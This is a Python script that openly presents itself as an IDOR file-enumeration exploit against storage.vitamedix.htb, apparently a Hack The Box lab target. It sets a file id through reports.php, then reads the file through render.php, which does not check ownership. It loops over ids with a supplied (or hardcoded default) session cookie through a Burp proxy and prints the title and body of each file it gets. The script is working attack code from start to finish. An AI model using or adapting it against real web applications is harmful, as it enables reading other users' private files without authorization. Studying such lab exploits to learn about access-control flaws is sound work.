#!/usr/bin/env python3  
"""  
Vitamedix Storage IDOR file enumeration exploit.  
  
Bug: reports.php stores the requested id in $_SESSION['id'].  
     render.php reads $_SESSION['id'] and displays the file WITHOUT     re-checking ownership, so any authenticated user can read any file.  
Usage:  
    python3 idor_enum.py --cookie "PHPSESSID=..." --start 1 --end 100"""  
  
import argparse  
import re  
import requests  
  
  
def parse_args():  
    parser = argparse.ArgumentParser(description="Enumerate file IDs via IDOR on storage.vitamedix.htb")  
    parser.add_argument("--host", default="http://storage.vitamedix.htb", help="Target base URL")  
    parser.add_argument("--cookie", default="icfj8f8jhsgqdf69cuh5r2e6hr", help="PHPSESSID cookie value (or full Cookie header)")  
    parser.add_argument("--start", type=int, default=1, help="Start ID")  
    parser.add_argument("--end", type=int, default=1000, help="End ID")  
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")  
    parser.add_argument("--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default: Burp Suite http://127.0.0.1:8080)")  
    return parser.parse_args()  
  
  
def build_headers(cookie):  
    headers = {  
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",  
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
        "Accept-Language": "en-US,en;q=0.9",  
        "Accept-Encoding": "gzip, deflate, br",  
        "Referer": "http://storage.vitamedix.htb/profile.php",  
        "Connection": "keep-alive",  
        "Upgrade-Insecure-Requests": "1",  
    }  
  
    # support either raw PHPSESSID value or full Cookie header  
    if "=" in cookie:  
        headers["Cookie"] = cookie  
    else:  
        headers["Cookie"] = f"PHPSESSID={cookie}"  
  
    return headers  
  
  
def extract_title_or_body(html):  
    """Pull a meaningful snippet from the rendered page."""  
    # try to grab card-title and card-content  
    title_match = re.search(r'<h4 class="card-title">(.*?)</h4>', html, re.DOTALL)  
    body_match = re.search(r'<p>(.*?)</p>', html, re.DOTALL)  
  
    title = re.sub(r'<[^>]+>', '', title_match.group(1)).strip() if title_match else ""  
    body = re.sub(r'<[^>]+>', '', body_match.group(1)).strip() if body_match else ""  
    return title, body  
  
  
def main():  
    args = parse_args()  
    headers = build_headers(args.cookie)  
    proxies = {"http": args.proxy, "https": args.proxy}  
    session = requests.Session()  
    session.headers.update(headers)  
    session.proxies.update(proxies)  
  
    print(f"[*] Target: {args.host}")  
    print(f"[*] Cookie: {headers['Cookie']}")  
    print(f"[*] Proxy:  {args.proxy}")  
    print(f"[*] Enumerating ids {args.start} -> {args.end}")  
    print("=" * 80)  
  
    for file_id in range(args.start, args.end + 1):  
        try:  
            # Step 1: set session id via reports.php  
            reports_url = f"{args.host}/reports.php?id={file_id}"  
            r1 = session.get(reports_url, timeout=args.timeout, allow_redirects=False)  
  
            # Step 2: read the file via render.php using the same session  
            render_url = f"{args.host}/render.php"  
            r2 = session.get(render_url, timeout=args.timeout)  
  
            status1 = r1.status_code  
            location = r1.headers.get("Location", "")  
            status2 = r2.status_code  
  
            # Heuristic: if render.php returned content containing card-title,  
            # we likely got a real file. error.php is the failure case.            title, body = extract_title_or_body(r2.text)  
  
            # Print only if we got something interesting  
            if title or body:  
                print(f"[+] id={file_id} | reports={status1} -> {location} | render={status2}")  
                if title:  
                    print(f"    Title: {title[:200]}")  
                if body:  
                    print(f"    Body:  {body[:500]}")  
                print("-" * 80)  
            else:  
                print(f"[-] id={file_id} | reports={status1} -> {location} | render={status2} | no content")  
  
        except requests.RequestException as e:  
            print(f"[!] id={file_id} request failed: {e}")  
  
  
if __name__ == "__main__":  
    main()